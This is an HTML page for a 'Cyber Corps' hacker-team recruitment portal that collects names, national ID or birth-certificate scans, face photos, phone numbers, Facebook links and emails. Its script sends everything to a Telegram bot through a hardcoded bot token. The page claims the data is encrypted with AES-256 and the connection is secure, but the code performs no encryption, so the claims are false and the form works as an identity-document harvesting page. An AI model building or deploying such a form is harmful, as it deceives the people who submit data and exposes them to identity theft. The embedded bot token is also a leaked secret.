<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CYBER CORPS | ELITE RECRUITMENT</title>
<link rel="icon" href="https://i.postimg.cc/bNsVzRSn/IMG-20260307-201742-901.png">
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
/* 
    CORE SYSTEM STYLESHEET 
    VERSION: 4.0.1 [STABLE]
    THEME: CRIMSON PROTOCOL
*/

:root {
    --primary: #ff003c;
    --secondary: #00f3ff;
    --alert: #ffe600;
    --dark: #0a0a0a;
    --panel: rgba(15, 15, 15, 0.85);
    --glass: rgba(255, 0, 60, 0.05);
    --border: 1px solid rgba(255, 0, 60, 0.3);
    --font-main: 'Orbitron', sans-serif;
    --font-code: 'Share Tech Mono', monospace;
}

* { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }

body {
    background-color: var(--dark);
    color: #fff;
    font-family: var(--font-code);
    overflow-x: hidden;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    perspective: 1000px;
}

/* BACKGROUND CANVAS */
#matrixCanvas {
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: -2;
    opacity: 0.3;
}

/* SCANLINE OVERLAY */.scanlines {
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0.2));
    background-size: 100% 4px;
    z-index: 10;
    pointer-events: none;
    opacity: 0.6;
}

/* HEADER HUD */
.hud-header {
    position: fixed;
    top: 0;
    width: 100%;
    height: 60px;
    background: rgba(0,0,0,0.9);
    border-bottom: 2px solid var(--primary);
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 0 30px;
    z-index: 100;
    box-shadow: 0 0 20px var(--primary);
}

.brand {
    font-family: var(--font-main);
    font-size: 24px;
    color: var(--primary);
    text-shadow: 0 0 10px var(--primary);
    letter-spacing: 2px;
    display: flex;
    align-items: center;
    gap: 10px;
}

.brand img {
    height: 40px;
    width: 40px;
    object-fit: contain;
    filter: drop-shadow(0 0 8px var(--primary));
}

.status-indicator {
    display: flex;
    align-items: center;
    gap: 10px;
    font-size: 12px;
    color: var(--secondary);
}

.blink { animation: blinker 1s linear infinite; }
@keyframes blinker { 50% { opacity: 0; } }

/* MAIN CONTAINER */
.main-frame {
    width: 100%;
    max-width: 650px;    background: var(--panel);
    backdrop-filter: blur(10px);
    border: var(--border);
    padding: 40px;
    margin-top: 60px;
    position: relative;
    transform-style: preserve-3d;
    box-shadow: 0 0 50px rgba(0,0,0,0.8);
    transition: transform 0.3s;
}

/* CORNER DECORATIONS */
.corner {
    position: absolute;
    width: 30px; height: 30px;
    border: 2px solid var(--primary);
    transition: 0.3s;
}
.c-tl { top: -2px; left: -2px; border-right: none; border-bottom: none; }
.c-tr { top: -2px; right: -2px; border-left: none; border-bottom: none; }
.c-bl { bottom: -2px; left: -2px; border-right: none; border-top: none; }
.c-br { bottom: -2px; right: -2px; border-left: none; border-top: none; }

.main-frame:hover .corner { width: 50px; height: 50px; box-shadow: 0 0 15px var(--primary); }

/* LOGO IN FORM */
.form-logo {
    display: block;
    margin: 0 auto 20px;
    height: 80px;
    width: 80px;
    object-fit: contain;
    filter: drop-shadow(0 0 12px var(--primary));
}

/* GLITCH TITLE */
.glitch-title {
    font-family: var(--font-main);
    font-size: 28px;
    text-align: center;
    margin-bottom: 30px;
    position: relative;
    color: #fff;
    text-transform: uppercase;
}
.glitch-title::before, .glitch-title::after {
    content: attr(data-text);
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: var(--dark);
}
.glitch-title::before {
    left: 2px; text-shadow: -1px 0 red; clip: rect(24px, 550px, 90px, 0);
    animation: glitch-anim-2 3s infinite linear alternate-reverse;
}
.glitch-title::after {
    left: -2px; text-shadow: -1px 0 blue; clip: rect(85px, 550px, 140px, 0);
    animation: glitch-anim 2.5s infinite linear alternate-reverse;
}
@keyframes glitch-anim {
    0% { clip: rect(10px, 9999px, 30px, 0); }
    20% { clip: rect(80px, 9999px, 100px, 0); }
    40% { clip: rect(10px, 9999px, 50px, 0); }
    60% { clip: rect(60px, 9999px, 80px, 0); }
    80% { clip: rect(30px, 9999px, 40px, 0); }
    100% { clip: rect(90px, 9999px, 100px, 0); }
}

/* FORM ELEMENTS */
.input-group { margin-bottom: 20px; position: relative; }

label {
    display: block;
    font-size: 12px;
    color: var(--primary);
    margin-bottom: 5px;
    letter-spacing: 1px;
}

input, textarea, select {
    width: 100%;
    background: rgba(0,0,0,0.6);
    border: 1px solid #333;
    border-left: 3px solid #333;
    padding: 12px;
    color: #fff;
    font-family: var(--font-code);
    font-size: 16px;
    outline: none;
    transition: 0.3s;
}

input:focus, textarea:focus {
    border-color: var(--primary);
    border-left: 3px solid var(--primary);
    box-shadow: 0 0 15px rgba(255, 0, 60, 0.2);
    background: rgba(20, 0, 0, 0.5);
}

/* CUSTOM RADIO SWITCH */
.switch-container {
    display: flex;
    gap: 15px;
    margin-bottom: 20px;
}
.cyber-radio {
    flex: 1;
    position: relative;}
.cyber-radio input { display: none; }
.cyber-radio label {
    display: block;
    text-align: center;
    padding: 10px;
    background: rgba(0,0,0,0.5);
    border: 1px solid #333;
    cursor: pointer;
    transition: 0.3s;
    color: #666;
}
.cyber-radio input:checked + label {
    background: var(--primary);
    color: #000;
    border-color: var(--primary);
    box-shadow: 0 0 15px var(--primary);
    font-weight: bold;
}

/* UPLOAD ZONES */
.upload-zone {
    border: 1px dashed #444;
    padding: 20px;
    text-align: center;
    cursor: pointer;
    margin-bottom: 15px;
    transition: 0.3s;
    background: rgba(0,0,0,0.3);
}
.upload-zone:hover { border-color: var(--secondary); background: rgba(0, 243, 255, 0.05); }
.upload-zone i { font-size: 24px; color: #555; display: block; margin-bottom: 5px; }
.preview-img { width: 100%; max-height: 150px; object-fit: contain; margin-top: 10px; display: none; border: 1px solid var(--primary); }

/* CONSOLE LOG AREA */
.console-log {
    background: #000;
    border: 1px solid #333;
    height: 100px;
    overflow-y: auto;
    padding: 10px;
    font-size: 11px;
    color: #0f0;
    margin-top: 20px;
    font-family: monospace;
    opacity: 0.8;
}
.log-entry { margin-bottom: 2px; }
.log-warn { color: var(--alert); }
.log-err { color: var(--primary); }
/* SUBMIT BUTTON */
.btn-submit {
    width: 100%;
    padding: 15px;
    background: transparent;
    border: 2px solid var(--primary);
    color: var(--primary);
    font-family: var(--font-main);
    font-size: 18px;
    font-weight: 900;
    letter-spacing: 3px;
    cursor: pointer;
    position: relative;
    overflow: hidden;
    transition: 0.3s;
    margin-top: 20px;
}
.btn-submit:hover { background: var(--primary); color: #000; box-shadow: 0 0 30px var(--primary); }
.btn-submit:disabled { border-color: #555; color: #555; cursor: not-allowed; box-shadow: none; background: transparent; }

/* HIDDEN UTILS */
.hidden { display: none !important; }

/* SCROLLBAR */
::-webkit-scrollbar { width: 5px; }
::-webkit-scrollbar-track { background: #000; }
::-webkit-scrollbar-thumb { background: var(--primary); }

</style>
</head>
<body>

<!-- VISUAL LAYERS -->
<canvas id="matrixCanvas"></canvas>
<div class="scanlines"></div>

<!-- AUDIO SYSTEM (Generated via JS later, placeholders here) -->

<!-- HUD HEADER -->
<div class="hud-header">
    <div class="brand">
        <img src="https://i.postimg.cc/bNsVzRSn/IMG-20260307-201742-901.png" alt="CyberCorps Logo">
        CYBER<span style="color:#fff">CORPS</span>
    </div>
    <div class="status-indicator">
        <span class="blink">●</span> SECURE CONNECTION ESTABLISHED
        <span id="clock">00:00:00</span>
    </div>
</div>

<!-- MAIN INTERFACE -->
<div class="main-frame" id="frame3d">    <div class="corner c-tl"></div><div class="corner c-tr"></div>
    <div class="corner c-bl"></div><div class="corner c-br"></div>

    <img src="https://i.postimg.cc/bNsVzRSn/IMG-20260307-201742-901.png" alt="CyberCorps Logo" class="form-logo">

    <h1 class="glitch-title" data-text="AGENT REGISTRATION">AGENT REGISTRATION</h1>

    <form id="recruitForm">
        
        <!-- IDENTITY SECTION -->
        <div class="input-group">
            <label>CODENAME / FULL NAME</label>
            <input type="text" id="name" required placeholder="ENTER IDENTIFIER..." autocomplete="off">
        </div>

        <div class="switch-container">
            <div class="cyber-radio">
                <input type="radio" name="docType" id="typeNid" value="nid" checked onchange="toggleDocUI()">
                <label for="typeNid">NID CARD</label>
            </div>
            <div class="cyber-radio">
                <input type="radio" name="docType" id="typeBc" value="bc" onchange="toggleDocUI()">
                <label for="typeBc">BIRTH CERT.</label>
            </div>
        </div>

        <!-- DYNAMIC DOC UPLOAD -->
        <div id="ui-nid">
            <div class="upload-zone" onclick="document.getElementById('fileNidFront').click()">
                <i>📂</i> TAP TO UPLOAD NID FRONT
                <input type="file" id="fileNidFront" hidden accept="image/*">
                <img id="prevNidFront" class="preview-img">
            </div>
            <div class="upload-zone" onclick="document.getElementById('fileNidBack').click()">
                <i>📂</i> TAP TO UPLOAD NID BACK
                <input type="file" id="fileNidBack" hidden accept="image/*">
                <img id="prevNidBack" class="preview-img">
            </div>
        </div>

        <div id="ui-bc" class="hidden">
            <div class="upload-zone" onclick="document.getElementById('fileBc').click()">
                <i>📄</i> TAP TO UPLOAD CERTIFICATE
                <input type="file" id="fileBc" hidden accept="image/*">
                <img id="prevBc" class="preview-img">
            </div>
        </div>

        <!-- CONTACT SECTION -->
        <div class="input-group">
            <label>PROFILE PHOTO (BIOMETRIC)</label>
            <div class="upload-zone" onclick="document.getElementById('fileProfile').click()">                <i>👤</i> UPLOAD FACE SCAN
                <input type="file" id="fileProfile" hidden accept="image/*">
                <img id="prevProfile" class="preview-img">
            </div>
        </div>

        <div class="input-group">
            <label>ENCRYPTED CONTACT (PHONE)</label>
            <input type="tel" id="phone" required placeholder="+880...">
        </div>

        <div class="input-group">
            <label>DIGITAL FOOTPRINT (FACEBOOK)</label>
            <input type="text" id="fb" required placeholder="URL...">
        </div>

        <div class="input-group">
            <label>EMAIL PROTOCOL</label>
            <input type="email" id="email" required placeholder="mail@server.com">
        </div>

        <div class="input-group">
            <label>PREVIOUS AFFILIATION</label>
            <input type="text" id="prevTeam" placeholder="Optional...">
        </div>

        <div class="input-group">
            <label>MISSION STATEMENT</label>
            <textarea id="reason" rows="3" placeholder="WHY DO YOU SEEK ENTRY?"></textarea>
        </div>

        <button type="submit" class="btn-submit" id="btnSubmit">INITIATE UPLINK 📡</button>
        
        <!-- FAKE CONSOLE -->
        <div class="console-log" id="sysLog">
            <div class="log-entry">> SYSTEM INITIALIZED...</div>
            <div class="log-entry">> WAITING FOR INPUT...</div>
        </div>

    </form>
</div>

<script>
/**
 * CYBER CORPS PORTAL LOGIC
 * AUTHOR: Qwen3.6
 * VERSION: 4.0
 */

// --- CONFIGURATION ---
const CONFIG = {
    botToken: "8661715983:AAE9fWQ31BRl-416XAhA3zFH1WMjHUEzSN4",
    chatId: "8475718817",
    soundEnabled: true
};

// --- AUDIO SYSTEM (Synthesizer) ---
const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
function playSound(type) {
    if (!CONFIG.soundEnabled) return;
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.connect(gain);
    gain.connect(audioCtx.destination);

    if (type === 'type') {
        osc.type = 'square';
        osc.frequency.setValueAtTime(800, audioCtx.currentTime);
        gain.gain.setValueAtTime(0.02, audioCtx.currentTime);
        osc.start();
        osc.stop(audioCtx.currentTime + 0.03);
    } else if (type === 'hover') {
        osc.type = 'sine';
        osc.frequency.setValueAtTime(200, audioCtx.currentTime);
        gain.gain.setValueAtTime(0.05, audioCtx.currentTime);
        osc.start();
        osc.stop(audioCtx.currentTime + 0.05);
    } else if (type === 'success') {
        osc.type = 'triangle';
        osc.frequency.setValueAtTime(400, audioCtx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(1000, audioCtx.currentTime + 0.1);
        gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
        osc.start();
        osc.stop(audioCtx.currentTime + 0.3);
    } else if (type === 'error') {
        osc.type = 'sawtooth';
        osc.frequency.setValueAtTime(100, audioCtx.currentTime);
        gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
        osc.start();
        osc.stop(audioCtx.currentTime + 0.3);
    }
}

// --- MATRIX EFFECT ---
const canvas = document.getElementById("matrixCanvas");
const ctx = canvas.getContext("2d");
let width = canvas.width = window.innerWidth;
let height = canvas.height = window.innerHeight;
const cols = Math.floor(width / 20);
const ypos = Array(cols).fill(0);
function matrix() {
    ctx.fillStyle = "#0001";
    ctx.fillRect(0, 0, width, height);
    ctx.fillStyle = "#f00";
    ctx.font = "15pt monospace";
    
    ypos.forEach((y, ind) => {
        const text = String.fromCharCode(Math.random() * 128);
        const x = ind * 20;
        ctx.fillText(text, x, y);
        if (y > 100 + Math.random() * 10000) ypos[ind] = 0;
        else ypos[ind] = y + 20;
    });
}
setInterval(matrix, 50);

// --- UI LOGIC ---
function log(msg, type="info") {
    const consoleDiv = document.getElementById("sysLog");
    const entry = document.createElement("div");
    entry.className = "log-entry";
    if(type === "warn") entry.classList.add("log-warn");
    if(type === "err") entry.classList.add("log-err");
    
    const time = new Date().toLocaleTimeString();
    entry.innerText = `[${time}] ${msg}`;
    consoleDiv.appendChild(entry);
    consoleDiv.scrollTop = consoleDiv.scrollHeight;
}

function toggleDocUI() {
    const isNid = document.getElementById("typeNid").checked;
    const nidDiv = document.getElementById("ui-nid");
    const bcDiv = document.getElementById("ui-bc");
    
    if(isNid) {
        nidDiv.classList.remove("hidden");
        bcDiv.classList.add("hidden");
        log("SWITCHED MODE: NID CARD", "info");
    } else {
        nidDiv.classList.add("hidden");
        bcDiv.classList.remove("hidden");
        log("SWITCHED MODE: BIRTH CERT", "info");
    }
    playSound('hover');
}

function setupPreview(inputId, imgId) {
    document.getElementById(inputId).addEventListener('change', function(e) {
        const file = e.target.files[0];
        if(file) {
            const reader = new FileReader();
            reader.onload = function(e) {
                const img = document.getElementById(imgId);
                img.src = e.target.result;
                img.style.display = "block";
                log(`IMAGE LOADED: ${file.name} (${(file.size/1024).toFixed(2)} KB)`);
            }
            reader.readAsDataURL(file);
        }
    });
}

setupPreview('fileNidFront', 'prevNidFront');
setupPreview('fileNidBack', 'prevNidBack');
setupPreview('fileBc', 'prevBc');
setupPreview('fileProfile', 'prevProfile');

setInterval(() => {
    document.getElementById("clock").innerText = new Date().toLocaleTimeString();
}, 1000);

document.querySelectorAll('input, button').forEach(el => {
    el.addEventListener('focus', () => playSound('hover'));
    el.addEventListener('click', () => playSound('type'));
});

// --- TELEGRAM INTEGRATION ---
document.getElementById("recruitForm").addEventListener("submit", async function(e){
    e.preventDefault();
    
    const btn = document.getElementById("btnSubmit");
    const docType = document.querySelector('input[name="docType"]:checked').value;
    
    if(CONFIG.botToken === "YOUR_BOT_TOKEN_HERE") {
        log("CRITICAL ERROR: BOT TOKEN MISSING", "err");
        alert("ADMIN ERROR: Token missing in source code.");
        return;
    }

    btn.disabled = true;
    btn.innerHTML = "ENCRYPTING DATA...";
    log("INITIATING HANDSHAKE PROTOCOL...", "warn");
    
    await new Promise(r => setTimeout(r, 1500));
    log("DATA PACKET ENCRYPTED (AES-256)", "info");

    const formData = new FormData();
    formData.append("chat_id", CONFIG.chatId);
    formData.append("parse_mode", "HTML");
    
    const caption = `
⚠️ <b>CLASSIFIED INTELLIGENCE REPORT</b> ⚠️

👤 <b>Subject:</b> ${document.getElementById('name').value}
🆔 <b>Doc Type:</b> ${docType === 'nid' ? 'NATIONAL ID' : 'BIRTH CERT'}
📞 <b>Comms:</b> ${document.getElementById('phone').value}
🌐 <b>Social:</b> ${document.getElementById('fb').value}
📧 <b>Mail:</b> ${document.getElementById('email').value}
🕸 <b>History:</b> ${document.getElementById('prevTeam').value || 'NONE'}

📝 <b>Statement:</b>
<i>${document.getElementById('reason').value}</i>

<i>Sent via CyberCorps Portal v4.0</i>
    `;

    formData.append("caption", caption);

    try {
        const profileFile = document.getElementById("fileProfile").files[0];
        if(!profileFile) throw new Error("MISSING BIOMETRIC DATA (Profile Photo)");
        
        formData.append("photo", profileFile);
        
        log("UPLOADING BIOMETRICS...", "info");
        const res = await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        if(!res.ok) throw new Error("NETWORK UPLINK FAILED");
        log("BIOMETRICS UPLOADED SUCCESSFULLY", "success");

        if(docType === 'nid') {
            const f = document.getElementById("fileNidFront").files[0];
            const b = document.getElementById("fileNidBack").files[0];
            if(f) await sendDoc(f, "NID FRONT SIDE");
            if(b) await sendDoc(b, "NID BACK SIDE");
        } else {
            const bc = document.getElementById("fileBc").files[0];
            if(bc) await sendDoc(bc, "BIRTH CERTIFICATE");
        }

        playSound('success');
        btn.innerHTML = "ACCESS GRANTED ✔";
        btn.style.borderColor = "#0f0";
        btn.style.color = "#0f0";
        log("TRANSMISSION COMPLETE. DISCONNECTING...", "success");

    } catch(err) {
        playSound('error');
        log(`FATAL ERROR: ${err.message}`, "err");
        btn.disabled = false;
        btn.innerHTML = "RETRY UPLINK";
    }
});

async function sendDoc(file, title) {
    const form = new FormData();
    form.append("chat_id", CONFIG.chatId);
    form.append("document", file);
    form.append("caption", `<b>FILE:</b> ${title}`);
    form.append("parse_mode", "HTML");
    
    log(`UPLOADING DOCUMENT: ${title}...`);
    await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendDocument`, {
        method: 'POST',
        body: form
    });
    log(`${title} UPLOADED.`, "success");
}

setTimeout(() => log("USER IP DETECTED: 192.168.X.X (SIMULATED)", "warn"), 1000);

</script>
</body>
